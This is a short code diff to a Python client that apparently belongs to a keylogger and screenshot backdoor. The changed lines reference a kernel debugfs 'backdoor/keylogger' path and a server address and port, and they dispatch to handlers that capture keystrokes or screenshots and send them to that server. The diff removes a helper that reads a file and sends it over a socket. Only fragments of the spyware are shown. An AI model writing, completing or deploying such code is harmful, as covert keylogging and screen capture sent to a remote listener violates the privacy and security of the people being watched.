@@ -3,18 +3,6 @@ import time
 import sys
 import os
 
-def send_file(filename, sock):
-    # OPEN FILE TO READ
-    with open(filename, 'rb') as file:
-        while True:
-            # READ FILE
-            data = file.read()
-            
-            # SEND FILE TO SERVER
-            sock.sendall(data)
-
-            break
-            
 
 def handle_prt_sc(destination_address, destination_port):
     path = '/home/michel/pessoal/'
@@ -83,10 +71,11 @@ def handle_keylogger(destination_address, destination_port):
 
 # EXECUTES THE CLIENT
 if __name__ == '__main__':
-    #target_file = '/sys/kernel/debug/backdoor/keylogger'
+    # SERVER CONFIGURATIONS #
     destination_address = '127.0.0.1'  
     destination_port = 8080  
     
+    # ARGS 
     if sys.argv[1] == 'keylogger':
         handle_keylogger(destination_address, destination_port)
     elif sys.argv[1] == 'prtsc':
